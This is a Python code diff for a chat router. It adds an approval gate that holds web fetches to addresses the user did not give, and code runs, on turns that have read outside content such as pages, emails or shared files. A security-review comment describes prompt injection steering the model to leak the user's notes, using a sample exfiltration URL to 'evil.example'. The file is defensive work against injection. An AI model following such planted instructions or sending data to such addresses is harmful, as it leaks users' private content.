@@ -9,10 +9,12 @@ need to spin up the chat router.
 from __future__ import annotations
 
 import abc
+import re
 import uuid
 from collections.abc import Callable
 from dataclasses import dataclass, field
 from typing import Any
+from urllib.parse import urlsplit
 
 from sqlalchemy.ext.asyncio import AsyncSession
 
@@ -39,7 +41,19 @@ class TurnState(dict):
     def __setitem__(self, key: str, value: Any) -> None:
         if key == "untrusted":
             dict.__setitem__(self, "own_attachments_only", False)
+            if value:
+                # Something other than your own attachments or the code
+                # tool's own output: what holds a code run (guard_outbound).
+                dict.__setitem__(self, "outside", True)
         dict.__setitem__(self, key, value)
+
+    def saw_code_output(self) -> None:
+        """``code_interpreter``'s output reached the turn. It's outside content
+        for writes and for opening web pages (it can print a shared file), but
+        not a reason to hold the next code run: that would stop every
+        "fix the error and run it again"."""
+        dict.__setitem__(self, "untrusted", True)
+        dict.__setitem__(self, "own_attachments_only", False)
 
     def saw_files(self, files: Any, *, user_id: Any, in_workspace: bool) -> None:
         """File text reached this turn's prompt: outside content, whoever owns the file
@@ -265,5 +279,126 @@ def guard_write(ctx: ToolContext, doing: str, *, own_attachments_ok: bool = Fals
     if not turn or not turn.get("untrusted") or turn.get("user_approved"):
         return
     if own_attachments_ok and turn.get("own_attachments_only"):
+        return
+    raise HoldForApproval(doing)
+
+
+# ---------------------------------------------------------------- outbound
+# Security review H2: a page, an email or a shared file can tell the model to
+# send what it has seen somewhere ("open https://evil.example/?d=<the user's
+# notes>"), or to run code. On a turn whose earlier steps read outside
+# content, ``fetch_url`` to an address the person didn't give (in their own
+# message, or this turn's search results) and ``code_interpreter`` wait for
+# the person's yes, through the same approval card as held writes.
+#
+# What counts is what the turn had read *before* the current step: calls in
+# one step run together, so a fetch can't have been steered by a page read
+# alongside it. The dispatcher records that as ``turn["before_step"]``; paths
+# without it (headless runs) use the turn as it stands.
+
+_URL_RE = re.compile(r"(?:https?://|www\.)[^\s<>\"'`)\]}]+|\b(?:[a-z0-9-]+\.)+[a-z]{2,24}/[^\s<>\"'`)\]}]*", re.I)
+
+
+def url_key(url: str) -> str | None:
+    """Compare addresses the way a person means them: scheme, ``www.``, a
+    fragment and a trailing slash don't make a different page."""
+    raw = (url or "").strip().rstrip(".,;:!?")
+    if not raw:
+        return None
+    if not re.match(r"^[a-z][a-z0-9+.-]*://", raw, re.I):
+        raw = "http://" + raw
+    try:
+        parts = urlsplit(raw)
+    except ValueError:
+        return None
+    host = (parts.hostname or "").lower()
+    if not host:
+        return None
+    if host.startswith("www."):
+        host = host[4:]
+    port = f":{parts.port}" if parts.port and parts.port not in (80, 443) else ""
+    path = parts.path.rstrip("/")
+    query = f"?{parts.query}" if parts.query else ""
+    return f"{host}{port}{path}{query}"
+
+
+def urls_in(text: str | None) -> set[str]:
+    """The addresses written in a piece of text, as :func:`url_key` keys."""
+    out: set[str] = set()
+    for m in _URL_RE.finditer(text or ""):
+        k = url_key(m.group(0))
+        if k:
+            out.add(k)
+    return out
+
+
+def allow_urls(turn: dict[str, Any] | None, urls: Any) -> None:
+    """Addresses the person gave or this turn's search found: opening them
+    never waits for a yes."""
+    if turn is None:
+        return
+    keys = turn.get("allowed_urls")
+    if not isinstance(keys, set):
+        keys = set()
+        dict.__setitem__(turn, "allowed_urls", keys)
+    for u in urls or ():
+        k = url_key(str(u))
+        if k:
+            keys.add(k)
+
+
+def note_sources(turn: dict[str, Any] | None, sources: Any) -> None:
+    """A search's results (``ToolResult.sources``) become openable."""
+    allow_urls(turn, [s.get("url") for s in (sources or []) if isinstance(s, dict) and s.get("url")])
+
+
+def url_allowed(turn: dict[str, Any] | None, url: str) -> bool:
+    k = url_key(url)
+    return bool(k and turn and k in (turn.get("allowed_urls") or ()))
+
+
+def start_step(turn: dict[str, Any] | None, tool_names: Any) -> None:
+    """Called once per step, before its calls run: remember what the turn
+    had read so far (``before_step``), then mark it for what this step
+    reads. Only the code tool's own output doesn't count as ``outside``."""
+    if turn is None:
+        return
+    dict.__setitem__(
+        turn,
+        "before_step",
+        {"untrusted": bool(turn.get("untrusted")), "outside": _outside(turn)},
+    )
+    readers = [n for n in tool_names if reads_outside_content(n or "")]
+    if not readers:
+        return
+    if all(n == "code_interpreter" for n in readers) and isinstance(turn, TurnState):
+        turn.saw_code_output()
+    else:
+        turn["untrusted"] = True
+        if not isinstance(turn, TurnState):
+            turn["outside"] = True
+
+
+def _outside(turn: dict[str, Any]) -> bool:
+    if isinstance(turn, TurnState):
+        return bool(turn.get("outside")) and not turn.get("own_attachments_only")
+    return bool(turn.get("outside", turn.get("untrusted")))
+
+
+def guard_outbound(ctx: ToolContext, doing: str, *, url: str | None = None) -> None:
+    """Hold an outbound call on a steered turn (see above). ``url`` set: a
+    page to open, fine when the person gave it or a search found it this
+    turn; anything outside counts. No ``url``: a code run, held only for
+    content beyond your own attachments and the code tool's own output."""
+    turn = ctx.turn
+    if not turn or turn.get("user_approved"):
+        return
+    before = turn.get("before_step")
+    if not isinstance(before, dict):
+        before = {"untrusted": bool(turn.get("untrusted")), "outside": _outside(turn)}
+    if url is not None:
+        if not before.get("untrusted") or url_allowed(turn, url):
+            return
+    elif not before.get("outside"):
         return
     raise HoldForApproval(doing)
